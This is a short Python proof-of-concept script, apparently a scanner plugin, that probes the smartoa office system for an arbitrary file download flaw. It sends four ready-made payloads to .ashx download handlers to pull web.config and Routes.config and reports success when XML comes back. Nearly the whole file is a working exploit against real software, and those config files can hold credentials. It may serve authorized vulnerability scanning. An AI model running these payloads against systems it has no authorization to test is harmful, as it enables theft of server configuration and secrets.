#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: smartoa 多处任意文件下载漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-060613
author: Lucifer
description: smartoa系统中,EmailDownload.ashx的url参数,UDFDownLoad.ashx的path参数,DownLoad.ashx的path参数,MyDownLoad的path参数均未经过
    校验，导致任意文件下载，可获取敏感信息
'''
import sys
import requests
import warnings
def run(url):
        result = ['smartoa 多处任意文件下载漏洞','','']
        try:
            noexist = True
            for payload in [r"/file/EmailDownload.ashx?url=~/web.config&name=web.config", r"/file/UDFDownLoad.ashx?path=~/web.config&name=web.config",
                            r"/file/DownLoad.ashx?path=~/Routes.config", r"/file/MyDownLoad.ashx?path=~/Routes.config"]:
                vulnurl = url + payload
                req = requests.get(vulnurl, timeout=10, verify=False)
                if req.headers["Content-Type"] == "application/xml":
                    result[2]=  '存在'
                    result[1] = vulnurl
                    noexist = False
            if noexist:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
